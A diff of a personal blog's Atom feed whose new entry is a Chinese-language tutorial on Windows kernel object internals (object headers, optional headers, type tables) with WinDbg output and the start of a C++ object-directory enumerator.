@@ -1,5 +1,330 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://citrusice.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://citrusice.github.io/" rel="alternate" type="text/html" /><updated>2021-09-07T15:15:29+08:00</updated><id>https://citrusice.github.io/feed.xml</id><title type="html">Nqd8VId6</title><subtitle>my blog
-</subtitle><entry><title type="html">调试PE装载过程——0xC000007B</title><link href="https://citrusice.github.io/posts/debugging-error-code-0xc000007b/" rel="alternate" type="text/html" title="调试PE装载过程——0xC000007B" /><published>2021-09-07T15:02:28+08:00</published><updated>2021-09-07T15:02:28+08:00</updated><id>https://citrusice.github.io/posts/debugging-error-code-0xc000007b</id><content type="html" xml:base="https://citrusice.github.io/posts/debugging-error-code-0xc000007b/">&lt;p&gt;自己写了个壳，对win10上一些程序加壳后发现程序无法运行，错误提示为0xC000007B，改来改去也找不到原因，于是准备调式一下，本文记录部分调试的过程以及思路。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://citrusice.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://citrusice.github.io/" rel="alternate" type="text/html" /><updated>2021-09-11T15:45:42+08:00</updated><id>https://citrusice.github.io/feed.xml</id><title type="html">Nqd8VId6</title><subtitle>my blog
+</subtitle><entry><title type="html">Windows内核对象</title><link href="https://citrusice.github.io/posts/windows-kernel-object/" rel="alternate" type="text/html" title="Windows内核对象" /><published>2021-09-11T15:38:57+08:00</published><updated>2021-09-11T15:38:57+08:00</updated><id>https://citrusice.github.io/posts/windows-kernel-object</id><content type="html" xml:base="https://citrusice.github.io/posts/windows-kernel-object/">&lt;h2 id=&quot;windows-kernel-object的结构&quot;&gt;Windows Kernel Object的结构&lt;/h2&gt;
+
+&lt;p&gt;从_OBJECT_HEADER看起&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt nt!_OBJECT_HEADER
+   +0x000 PointerCount     : Int8B
+   +0x008 HandleCount      : Int8B
+   +0x008 NextToFree       : Ptr64 Void
+   +0x010 Lock             : _EX_PUSH_LOCK
+   +0x018 TypeIndex        : UChar
+   +0x019 TraceFlags       : UChar
+   +0x01a InfoMask         : UChar
+   +0x01b Flags            : UChar
+   +0x020 ObjectCreateInfo : Ptr64 _OBJECT_CREATE_INFORMATION
+   +0x020 QuotaBlockCharged : Ptr64 Void
+   +0x028 SecurityDescriptor : Ptr64 Void
+   +0x030 Body             : _QUAD
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;当我们查看一个windows object时，我们查看的是object的body字段。&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; !process 0 0 explorer.exe
+PROCESS fffffa801a8e1b30
+    SessionId: 1  Cid: 087c    Peb: 7fffffd7000  ParentCid: 0840
+    DirBase: 0aa8e000  ObjectTable: fffff8a001e39d30  HandleCount: 642.
+    Image: explorer.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;如上，可以看到EPROCESS的位置在fffffa801a8e1b30，根据_OBJECT_HEADER的结构我们可以计算出其_OBJECT_HEADER的位置在fffffa801a8e1b30-30，即fffffa801a8e1b00上。可以使用!object来确认计算的结果是否正确&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt _OBJECT_HEADER fffffa801a8e1b00
+nt!_OBJECT_HEADER
+   +0x000 PointerCount     : 0n366
+   +0x008 HandleCount      : 0n7
+   +0x008 NextToFree       : 0x00000000`00000007 Void
+   +0x010 Lock             : _EX_PUSH_LOCK
+   +0x018 TypeIndex        : 0x7 ''
+   +0x019 TraceFlags       : 0 ''
+   +0x01a InfoMask         : 0x8 ''
+   +0x01b Flags            : 0 ''
+   +0x020 ObjectCreateInfo : 0xfffffa80`1a400100 _OBJECT_CREATE_INFORMATION
+   +0x020 QuotaBlockCharged : 0xfffffa80`1a400100 Void
+   +0x028 SecurityDescriptor : 0xfffff8a0`01dfd8db Void
+   +0x030 Body             : _QUAD
+kd&amp;gt; !object fffffa801a8e1b30
+Object: fffffa801a8e1b30  Type: (fffffa8018d42a80) Process
+    ObjectHeader: fffffa801a8e1b00 (new version)
+    HandleCount: 7  PointerCount: 366
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然而_OBJECT_HEADER与Body并不是整个object的全部，实际上在object header前面还有optional headers与pool header，一个完全的windows object应该是这样的：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;_POOL_HEADER&lt;/li&gt;
+  &lt;li&gt;_OBJECT_QUOTA_CHARGES (optional)&lt;/li&gt;
+  &lt;li&gt;_OBJECT_HANDLE_DB (optional)&lt;/li&gt;
+  &lt;li&gt;_OBJECT_NAME (optional)&lt;/li&gt;
+  &lt;li&gt;_OBJECT_CREATOR_INFO (optional)&lt;/li&gt;
+  &lt;li&gt;_OBJECT_HEADER&lt;/li&gt;
+  &lt;li&gt;body&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;_OBJECT_HEADER在_OBJECT_HEADER-&amp;gt;InfoMask中使用掩码的方式来表示哪些可选头存在&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Bit&lt;/th&gt;
+      &lt;th&gt;Type&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x01&lt;/td&gt;
+      &lt;td&gt;nt!_OBJECT_HEADER_CREATOR_INFO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x02&lt;/td&gt;
+      &lt;td&gt;nt!_OBJECT_HEADER_NAME_INFO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x04&lt;/td&gt;
+      &lt;td&gt;nt!_OBJECT_HEADER_HANDLE_INFO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x08&lt;/td&gt;
+      &lt;td&gt;nt!_OBJECT_HEADER_QUOTA_INFO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x10&lt;/td&gt;
+      &lt;td&gt;nt!_OBJECT_HEADER_PROCESS_INFO&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;内核中存在一个数组ObpInfoMaskToOffset，我们可以根据InfoMask我们可以计算出一个数值作为数组的索引，从而获取我们想要的optional header距离object header的偏移&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Offset = ObpInfoMaskToOffset[OBJECT_HEADER-&amp;gt;InfoMask &amp;amp; (DesiredHeaderBit&lt;/td&gt;
+      &lt;td&gt;(DesiredHeaderBit-1))]&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;在explorer.exe的例子中，其InfoMask值为8，因此他只有一个_OBJECT_HEADER_QUOTA_INFO的可选头，要计算出他的偏移则计算0x8 &amp;amp; (0x8&lt;/td&gt;
+      &lt;td&gt;0x8-1) = 0x8，根据计算出的索引值找到偏移&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; ?nt!ObpInfoMaskToOffset
+Evaluate expression: -8796025365056 = fffff800`04085dc0
+kd&amp;gt; db fffff800`04085dc0+0x8 L1
+fffff800`04085dc8  20     
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;得到偏移为0x20，用object header的地址减去偏移即为我们想找的可选头的地址&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt nt!_OBJECT_HEADER_QUOTA_INFO fffffa8018d42a80-20
+   +0x000 PagedPoolCharge  : 0
+   +0x004 NonPagedPoolCharge : 0
+   +0x008 SecurityDescriptorCharge : 0x13030002
+   +0x010 SecurityDescriptorQuotaBlock : (null) 
+   +0x018 Reserved         : 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;_object_type&quot;&gt;_OBJECT_TYPE&lt;/h3&gt;
+
+&lt;p&gt;windows内核中有许多不同类型的对象，每个对象在object header包含了一个字段标注了其类型。在win7之前的windows版本中存在一个Type字段其包含了一个指针指向一个_OBJECT_TYPE结构体，在新版本中，这个字段变为了TypeIndex，其包含了一个全局数组nt!ObTypeIndexTable的索引，而这个数组中存着不同类型的结构体的指针。&lt;/p&gt;
+
+&lt;p&gt;在上述例子中，EPROCESS对象的TypeIndex为7，因此我们可以通过nt!ObTypeIndexTable[0x7]来获取指向其_OBJECT_TYPE的指针&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt nt!_OBJECT_TYPE poi(nt!ObTypeIndexTable + ( 7 * @$ptrsize ))
+   +0x000 TypeList         : _LIST_ENTRY [ 0xfffffa80`18d42a80 - 0xfffffa80`18d42a80 ]
+   +0x010 Name             : _UNICODE_STRING &quot;Process&quot;
+   +0x020 DefaultObject    : (null) 
+   +0x028 Index            : 0x7 ''
+   +0x02c TotalNumberOfObjects : 0x27
+   +0x030 TotalNumberOfHandles : 0xf0
+   +0x034 HighWaterNumberOfObjects : 0x27
+   +0x038 HighWaterNumberOfHandles : 0xf2
+   +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER
+   +0x0b0 TypeLock         : _EX_PUSH_LOCK
+   +0x0b8 Key              : 0x636f7250
+   +0x0c0 CallbackList     : _LIST_ENTRY [ 0xfffffa80`18d42b40 - 0xfffffa80`18d42b40 ]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以看到，该对象是一个Process类型对象。&lt;/p&gt;
+
+&lt;p&gt;在windbg中可以使用”!object \ObjectTypes”来获取所有对象类型。&lt;/p&gt;
+
+&lt;p&gt;在windows10中，处于安全考虑，TypeIndex字段被使用异或加密&lt;/p&gt;
+
+&lt;p&gt;http://www.powerofcommunity.net/poc2018/nikita.pdf&lt;/p&gt;
+
+&lt;h3 id=&quot;一切皆对象_object_type对象&quot;&gt;一切皆对象——_OBJECT_TYPE对象&lt;/h3&gt;
+
+&lt;p&gt;如果我们使用!object命令来查看一个_OBJECT_TYPE结构体，我们会发现每一个类型竟然也是作为对象存在的&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; !object poi(nt!ObTypeIndexTable + ( 7 * @$ptrsize ))
+Object: fffffa8018d42a80  Type: (fffffa8018d41c00) Type
+    ObjectHeader: fffffa8018d42a50 (new version)
+    HandleCount: 0  PointerCount: 2
+    Directory Object: fffff8a0000068f0  Name: Process
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以看到，process类型对象的类型为Type。继续查看其object header&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt _OBJECT_HEADER fffffa8018d42a50
+nt!_OBJECT_HEADER
+   +0x000 PointerCount     : 0n2
+   +0x008 HandleCount      : 0n0
+   +0x008 NextToFree       : (null) 
+   +0x010 Lock             : _EX_PUSH_LOCK
+   +0x018 TypeIndex        : 0x2 ''
+   +0x019 TraceFlags       : 0 ''
+   +0x01a InfoMask         : 0x3 ''
+   +0x01b Flags            : 0x13 ''
+   +0x020 ObjectCreateInfo : (null) 
+   +0x020 QuotaBlockCharged : (null) 
+   +0x028 SecurityDescriptor : (null) 
+   +0x030 Body             : _QUAD
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以看到其TypeIndex为2，说明Type类型同样也存在nt!ObTypeIndexTable中&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dt nt!_OBJECT_TYPE poi(nt!ObTypeIndexTable + ( 2 * @$ptrsize ))
+   +0x000 TypeList         : _LIST_ENTRY [ 0xfffffa80`18d41bb0 - 0xfffffa80`1b524d60 ]
+   +0x010 Name             : _UNICODE_STRING &quot;Type&quot;
+   +0x020 DefaultObject    : 0xfffff800`040839e0 Void
+   +0x028 Index            : 0x2 ''
+   +0x02c TotalNumberOfObjects : 0x2a
+   +0x030 TotalNumberOfHandles : 0
+   +0x034 HighWaterNumberOfObjects : 0x2a
+   +0x038 HighWaterNumberOfHandles : 0
+   +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER
+   +0x0b0 TypeLock         : _EX_PUSH_LOCK
+   +0x0b8 Key              : 0x546a624f
+   +0x0c0 CallbackList     : _LIST_ENTRY [ 0xfffffa80`18d41cc0 - 0xfffffa80`18d41cc0 ]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;回到ProcessType的object header上，其InfoMask值为3，说明它具有_OBJECT_HEADER_CREATOR_INFO与_OBJECT_HEADER_NAME_INFO两个可选头，其中_OBJECT_HEADER_CREATOR_INFO具有一个双向链表，通过这个链表我们可以遍历所有的Type&lt;/p&gt;
+
+&lt;h2 id=&quot;windows-kernel-object存在哪&quot;&gt;Windows Kernel Object存在哪&lt;/h2&gt;
+
+&lt;p&gt;所有的对象都由windows对象管理器（Object Manager）统一管理并以namespace进行分类，每个named kernel object有一个类似路径一样的名字，例如表示C盘驱动器的对象名为&lt;strong&gt;\DosDevices\C:&lt;/strong&gt;，其中\DosDevice就是该对象的namespace。&lt;/p&gt;
+
+&lt;h2 id=&quot;打印所有内核对象&quot;&gt;打印所有内核对象&lt;/h2&gt;
+
+&lt;p&gt;使用Nt函数NtOpenDirectoryObject/NtQueryDirectoryObject来遍历所有的Directory，进而遍历所有对象&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//https://github.com/adobe/chromium/blob/master/sandbox/tools/finder/finder_kernel.cc&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;winternl.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;ntstatus.h&amp;gt;
+#define DIRECTORY_QUERY 1
+#define BUFFER_SIZE 0x800
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_OBJDIR_INFORMATION&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;UNICODE_STRING&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;ObjectName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;UNICODE_STRING&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;ObjectTypeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;                    &lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OBJDIR_INFORMATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;POBJDIR_INFORMATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PFN_NtOpenDirectoryObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_Out_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PHANDLE&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;DirectoryHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ACCESS_MASK&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;DesiredAccess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;POBJECT_ATTRIBUTES&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectAttributes&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PFN_NtQueryDirectoryObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;DirectoryHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_Out_opt_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;BOOLEAN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReturnSingleEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;BOOLEAN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RestartScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_Inout_&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;PULONG&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;_Out_opt_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PULONG&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ReturnLength&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PFN_RtlNtStatusToDosError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Status&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PrintNtStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;LPSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FormatMessageA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FORMAT_MESSAGE_FROM_SYSTEM&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;FORMAT_MESSAGE_FROM_HMODULE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;FORMAT_MESSAGE_ALLOCATE_BUFFER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;GetModuleHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;ntdll.dll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;MAKELANGID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LANG_NEUTRAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUBLANG_DEFAULT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wmain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wstring&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hNtdll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetModuleHandleA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ntdll.dll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;PFN_NtQueryDirectoryObject&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfnNtQueryDirectoryObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PFN_NtQueryDirectoryObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hNtdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;NtQueryDirectoryObject&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
